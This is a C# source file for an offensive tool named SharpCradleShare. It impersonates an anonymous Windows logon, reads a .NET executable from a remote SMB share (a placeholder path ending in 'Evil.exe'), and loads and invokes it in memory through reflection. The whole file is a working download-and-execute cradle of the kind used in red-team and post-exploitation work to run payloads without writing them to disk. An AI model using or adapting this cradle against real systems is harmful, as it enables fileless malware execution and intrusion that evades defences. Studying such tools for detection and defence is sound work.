using System;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Win32.SafeHandles;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Security.Principal;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

namespace SharpCradleShare
{
    class Program
    {
        static void Main(string[] args)
        {
                string domain = ".\\";
                string uname = "anonymous";
                string password = "";
                string folderPathToBinary = "\\\\IP\\MyFolder\\Evil.exe";
                object[] cmd = args.ToArray();
                
                using (new Impersonation(domain, uname, password))
                {
                    //Access folder and read the bytes from the binary file
                    FileStream fs = new FileStream(folderPathToBinary, FileMode.Open);
                    BinaryReader br = new BinaryReader(fs);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(fs.Length));
                    fs.Close();
                    br.Close();
                    loadAssembly(bin, cmd);
                }
            
        }//End Main
        //loadAssembly
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
    }//End Program Class

    //Impersonation Class
    [PermissionSet(SecurityAction.Demand, Name = "FullTrust")]
    public class Impersonation : IDisposable
    {
        private readonly SafeTokenHandle _handle;
        private readonly WindowsImpersonationContext _context;

        const int LOGON32_LOGON_NEW_CREDENTIALS = 9;

        public Impersonation(string domain, string username, string password)
        {
            var ok = LogonUser(username, domain, password,
                           LOGON32_LOGON_NEW_CREDENTIALS, 0, out this._handle);
            if (!ok)
            {
                var errorCode = Marshal.GetLastWin32Error();
                throw new ApplicationException(string.Format("Could not impersonate the elevated user.  LogonUser returned error code {0}.", errorCode));
            }

            this._context = WindowsIdentity.Impersonate(this._handle.DangerousGetHandle());
        }

        public void Dispose()
        {
            this._context.Dispose();
            this._handle.Dispose();
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);

        public sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
        {
            private SafeTokenHandle()
                : base(true) { }

            [DllImport("kernel32.dll")]
            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
            [SuppressUnmanagedCodeSecurity]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool CloseHandle(IntPtr handle);

            protected override bool ReleaseHandle()
            {
                return CloseHandle(handle);
            }
        }
    }//End Impersonation Class
}//End Namespace
